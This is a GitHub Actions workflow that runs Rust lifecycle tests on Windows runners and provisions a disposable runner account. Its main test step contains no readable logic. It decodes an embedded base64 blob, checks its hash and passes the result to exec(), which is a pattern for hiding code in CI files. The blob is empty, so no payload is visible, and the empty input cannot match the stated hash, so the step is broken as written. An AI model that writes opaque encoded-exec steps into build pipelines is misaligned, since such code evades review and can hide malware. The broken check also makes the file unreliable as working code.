name: Focused Windows lifecycle fixture replay
permissions:
  contents: read
defaults:
  run:
    shell: bash
env:
  CARGO_BUILD_JOBS: '2'
  CARGO_INCREMENTAL: '0'
  CARGO_PROFILE_DEV_DEBUG: '0'
  CARGO_PROFILE_TEST_DEBUG: '0'
  CARGO_TERM_COLOR: never
  RUST_BACKTRACE: '1'
jobs:
  windows:
    name: Lifecycle consumers (${{ matrix.features }})
    runs-on: windows-2025
    timeout-minutes: 65
    strategy:
      fail-fast: false
      matrix:
        features:
        - default
        - all
    steps:
    - uses: actions/checkout@11d5960a326750d5838078e36cf38b85af677262
      with:
        ref: 97e57ebd42dce4ae8862359d2b53c4b394d83a0a
        persist-credentials: false
    - uses: ./.github/actions/rust
    - uses: Swatinem/rust-cache@d1527c8f67ef9af357290475d4af4b0fab8f12e0
      with:
        shared-key: c29-windows-lifecycle-${{ matrix.features }}-v1
    - name: Register disposable runner account
      run: 'python scripts/ci/installation_account.py provision

        python scripts/ci/installation_account.py check

        '
    - name: Run lifecycle consumers and account for prior timeouts
      env:
        LIFECYCLE_FEATURES: ${{ matrix.features }}
        LIFECYCLE_OUT: ${{ runner.temp }}/lifecycle-${{ matrix.features }}
      run: 'import base64,hashlib

        raw=base64.b64decode('''')

        assert hashlib.sha256(raw).hexdigest()==''a6cf31d26f10a4a4bb6676018b9e10b8a14dad35dcb069cfe75635e759ca9c7d''

        exec(compile(raw,''independent-lifecycle-driver.py'',''exec''))

        '
      shell: python
    - name: Retain complete outcomes
      if: ${{ always() }}
      uses: actions/upload-artifact@ea165f8d65b6e75b540449e92b4886f43607fa02
      with:
        name: c29-lifecycle-${{ matrix.features }}
        path: ${{ runner.temp }}/lifecycle-${{ matrix.features }}
        retention-days: 14
        if-no-files-found: error
'on':
  push:
    branches:
    - prime/c29-windows-lifecycle-r1
  workflow_dispatch: null
